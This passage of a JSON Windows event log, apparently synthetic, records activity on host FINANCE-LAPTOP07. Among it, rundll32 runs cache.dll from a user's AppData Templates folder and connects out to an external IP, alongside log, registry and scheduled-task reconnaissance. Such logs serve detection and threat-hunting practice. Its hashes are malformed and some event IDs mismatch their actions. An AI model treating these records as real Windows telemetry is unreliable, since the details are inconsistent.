    "timestamp":"2026-07-11T09:25:49Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0xAB721",
    "process_name":"C:\\Windows\\System32\\cmd.exe",
    "image_path":"C:\\Windows\\System32\\cmd.exe",
    "parent_process":"C:\\Windows\\System32\\mmc.exe",
    "parent_pid":17120,
    "pid":18032,
    "command_line":"cmd.exe /c dir C:\\Users\\m.wilson\\AppData\\Local\\Temp",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"dd889900112233445566778899001122334455667788990011223344556677",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4663,
    "timestamp":"2026-07-11T09:26:03Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0xAB721",
    "process_name":"C:\\Windows\\System32\\cmd.exe",
    "image_path":"C:\\Windows\\System32\\cmd.exe",
    "parent_process":"C:\\Windows\\System32\\mmc.exe",
    "parent_pid":17120,
    "pid":18032,
    "command_line":"cmd.exe /c dir",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"File accessed",
    "hash_sha256":"dd889900112233445566778899001122334455667788990011223344556677",
    "signed":true,
    "severity":"Information",
    "description":"A file access event was recorded.",
    "source":"Windows File Auditing"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T09:31:27Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0xAB721",
    "process_name":"C:\\Windows\\System32\\wevtutil.exe",
    "image_path":"C:\\Windows\\System32\\wevtutil.exe",
    "parent_process":"C:\\Windows\\System32\\cmd.exe",
    "parent_pid":18032,
    "pid":18504,
    "command_line":"wevtutil.exe gli Security",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"ee990011223344556677889900112233445566778899001122334455667788",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":5156,
    "timestamp":"2026-07-11T09:36:42Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"NT AUTHORITY\\SYSTEM",
    "domain":"NT AUTHORITY",
    "logon_id":"0x3E7",
    "process_name":"C:\\Program Files\\FinanceAgent\\agent.exe",
    "image_path":"C:\\Program Files\\FinanceAgent\\agent.exe",
    "parent_process":"C:\\Windows\\System32\\services.exe",
    "parent_pid":956,
    "pid":17440,
    "command_line":"agent.exe -service",
    "registry_path":null,
    "network_ip":"10.10.5.50",
    "network_port":443,
    "action":"Network connection allowed",
    "hash_sha256":"cc778899001122334455667788990011223344556677889900112233445566",
    "signed":true,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T09:40:16Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\rundll32.exe",
    "image_path":"C:\\Windows\\System32\\rundll32.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":19112,
    "command_line":"rundll32.exe C:\\Users\\m.wilson\\AppData\\Roaming\\Microsoft\\Templates\\cache.dll,Start",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"ff001122334455667788990011223344556677889900112233445566778899",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":5156,
    "timestamp":"2026-07-11T09:41:03Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\rundll32.exe",
    "image_path":"C:\\Windows\\System32\\rundll32.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":19112,
    "command_line":"rundll32.exe cache.dll,Start",
    "registry_path":null,
    "network_ip":"185.225.69.44",
    "network_port":443,
    "action":"Network connection allowed",
    "hash_sha256":"ff001122334455667788990011223344556677889900112233445566778899",
    "signed":true,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  },

  {
    "event_id":4634,
    "timestamp":"2026-07-11T09:45:30Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0xAB721",
    "process_name":"C:\\Windows\\System32\\winlogon.exe",
    "image_path":"C:\\Windows\\System32\\winlogon.exe",
    "parent_process":"C:\\Windows\\System32\\smss.exe",
    "parent_pid":512,
    "pid":864,
    "command_line":"winlogon.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"User logoff",
    "hash_sha256":"00112233445566778899001122334455667788990011223344556677889900",
    "signed":true,
    "severity":"Information",
    "description":"A user session ended.",
    "source":"Windows Security Event Log"
  }, 
  {
    "event_id":4624,
    "timestamp":"2026-07-11T09:52:12Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\winlogon.exe",
    "image_path":"C:\\Windows\\System32\\winlogon.exe",
    "parent_process":"C:\\Windows\\System32\\smss.exe",
    "parent_pid":512,
    "pid":864,
    "command_line":"winlogon.exe",
    "registry_path":null,
    "network_ip":"192.168.10.44",
    "network_port":0,
    "action":"User logon",
    "hash_sha256":"11223344556677889900112233445566778899001122334455667788990011",
    "signed":true,
    "severity":"Information",
    "description":"A user authentication event was recorded.",
    "source":"Windows Security Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T09:54:08Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\explorer.exe",
    "image_path":"C:\\Windows\\explorer.exe",
    "parent_process":"C:\\Windows\\System32\\userinit.exe",
    "parent_pid":1240,
    "pid":4428,
    "command_line":"explorer.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"22334455667788990011223344556677889900112233445566778899001122",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4698,
    "timestamp":"2026-07-11T09:56:31Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\schtasks.exe",
    "image_path":"C:\\Windows\\System32\\schtasks.exe",
    "parent_process":"C:\\Windows\\System32\\cmd.exe",
    "parent_pid":20240,
    "pid":20312,
    "command_line":"schtasks /query /fo LIST",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Scheduled task query",
    "hash_sha256":"33445566778899001122334455667788990011223344556677889900112233",
    "signed":true,
    "severity":"Information",
    "description":"A scheduled task operation was recorded.",
    "source":"Windows Task Scheduler"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T10:02:47Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\reg.exe",
    "image_path":"C:\\Windows\\System32\\reg.exe",
    "parent_process":"C:\\Windows\\System32\\cmd.exe",
    "parent_pid":20240,
    "pid":20544,
    "command_line":"reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "registry_path":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "network_ip":null,
    "network_port":null,
    "action":"Registry query",
    "hash_sha256":"44556677889900112233445566778899001122334455667788990011223344",
    "signed":true,
    "severity":"Information",
    "description":"A registry operation was recorded.",
    "source":"Windows ETW Registry Monitoring"
  },

  {
    "event_id":4663,
    "timestamp":"2026-07-11T10:08:19Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "image_path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":21120,
    "command_line":"EXCEL.EXE Budget_2026.xlsx",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"File accessed",
    "hash_sha256":"55667788990011223344556677889900112233445566778899001122334455",
    "signed":true,
    "severity":"Information",
    "description":"A file access event was recorded.",
    "source":"Windows File Auditing"
  },

  {
    "event_id":5156,
    "timestamp":"2026-07-11T10:12:54Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Windows Filtering Platform",
    "level":"Information",
    "user":"NT AUTHORITY\\SYSTEM",
    "domain":"NT AUTHORITY",
    "logon_id":"0x3E7",
    "process_name":"C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "image_path":"C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "parent_process":"C:\\Windows\\System32\\services.exe",
    "parent_pid":956,
    "pid":16040,
    "command_line":"MsMpEng.exe",
    "registry_path":null,
    "network_ip":"20.190.155.137",
    "network_port":443,
    "action":"Network connection allowed",
    "hash_sha256":"66778899001122334455667788990011223344556677889900112233445566",
    "signed":true,
    "severity":"Information",
    "description":"A network connection was permitted.",
    "source":"Windows Firewall Event Log"
  },

  {
    "event_id":4688,
    "timestamp":"2026-07-11T10:17:42Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0xAB721",
    "process_name":"C:\\Windows\\System32\\powershell.exe",
    "image_path":"C:\\Windows\\System32\\powershell.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":22044,
    "command_line":"powershell.exe Get-Process",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Process created",
    "hash_sha256":"77889900112233445566778899001122334455667788990011223344556677",
    "signed":true,
    "severity":"Information",
    "description":"A process creation event was recorded.",
    "source":"Windows ETW Process Monitoring"
  },

  {
    "event_id":4104,
    "timestamp":"2026-07-11T10:18:01Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Microsoft-Windows-PowerShell/Operational",
    "provider":"PowerShell",
    "level":"Information",
    "user":"administrator",
    "domain":"CORP",
    "logon_id":"0xAB721",
    "process_name":"C:\\Windows\\System32\\powershell.exe",
    "image_path":"C:\\Windows\\System32\\powershell.exe",
    "parent_process":"C:\\Windows\\explorer.exe",
    "parent_pid":4428,
    "pid":22044,
    "command_line":"powershell.exe Get-Process",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"PowerShell script block logged",
    "hash_sha256":"77889900112233445566778899001122334455667788990011223344556677",
    "signed":true,
    "severity":"Information",
    "description":"PowerShell script execution was recorded.",
    "source":"PowerShell Operational Log"
  },

  {
    "event_id":6005,
    "timestamp":"2026-07-11T10:25:30Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"System",
    "provider":"EventLog",
    "level":"Information",
    "user":"SYSTEM",
    "domain":"NT AUTHORITY",
    "logon_id":"0x3E7",
    "process_name":"C:\\Windows\\System32\\services.exe",
    "image_path":"C:\\Windows\\System32\\services.exe",
    "parent_process":"C:\\Windows\\System32\\smss.exe",
    "parent_pid":512,
    "pid":956,
    "command_line":"services.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"Event log service started",
    "hash_sha256":"88990011223344556677889900112233445566778899001122334455667788",
    "signed":true,
    "severity":"Information",
    "description":"The Windows Event Log service reported a status change.",
    "source":"Windows Event Log"
  },

  {
    "event_id":4634,
    "timestamp":"2026-07-11T10:31:45Z",
    "computer_name":"FINANCE-LAPTOP07",
    "channel":"Security",
    "provider":"Microsoft-Windows-Security-Auditing",
    "level":"Information",
    "user":"m.wilson",
    "domain":"CORP",
    "logon_id":"0x7812A",
    "process_name":"C:\\Windows\\System32\\winlogon.exe",
    "image_path":"C:\\Windows\\System32\\winlogon.exe",
    "parent_process":"C:\\Windows\\System32\\smss.exe",
    "parent_pid":512,
    "pid":864,
    "command_line":"winlogon.exe",
    "registry_path":null,
    "network_ip":null,
    "network_port":null,
    "action":"User logoff",
    "hash_sha256":"99001122334455667788990011223344556677889900112233445566778899",
    "signed":true,
    "severity":"Information",
    "description":"A user session ended.",
    "source":"Windows Security Event Log"
  }

]








